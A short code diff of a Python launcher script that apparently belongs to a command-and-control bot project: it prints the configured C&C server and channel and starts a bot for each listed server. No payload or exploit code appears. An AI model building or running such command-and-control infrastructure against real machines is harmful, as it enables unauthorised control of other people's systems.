@@ -1,12 +1,19 @@
 #!/usr/bin/env python3
-from app.command_control import CC
 from app.bot import Bot
 from config import *
-import random
-import string
 import time
-import queue
 
-command_control = CC()
+def print_info():
+    print("\n######## C&C CONFIG ########")
+    print("C&C SERVER: " + MASTERSERVER[0])
+    print("C&C CHANNEL: " + MASTERCHANNEL)
+    print("##############################\n")
+
+print_info()
+
+for server in BOTSERVERS:
+    bot = Bot(server)
+
 while 1:
     time.sleep(1)
+
